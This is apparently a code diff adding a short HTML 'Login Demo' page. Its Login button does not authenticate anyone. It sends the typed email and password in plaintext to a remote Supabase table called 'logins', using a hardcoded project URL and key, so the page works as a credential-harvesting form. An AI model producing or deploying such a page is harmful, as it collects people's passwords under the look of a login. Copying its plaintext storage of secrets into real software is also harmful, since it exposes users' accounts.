@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Demo</title>
+</head>
+<body>
+
+<h3>Demo Login</h3>
+
+<input id="email" type="email" placeholder="Email"><br><br>
+<input id="password" type="password" placeholder="Password"><br><br>
+<button onclick="save()">Login</button>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+  const supabase = supabaseJs.createClient(
+    "https://cnksnbotqtreddoqorly.supabase.co",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNua3NuYm90cXRyZWRkb3Fvcmx5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjcwNzUsImV4cCI6MjA4MTc0MzA3NX0.NczMduUqbQaOaKqHAK_ojiWVU01H6WN1Y-UdccMHT7A"
+  );
+
+  async function save() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    await supabase
+      .from("logins")
+      .insert([{ email: email, password: password }]);
+
+    alert("Data saved");
+  }
+</script>
+
+</body>
+</html>
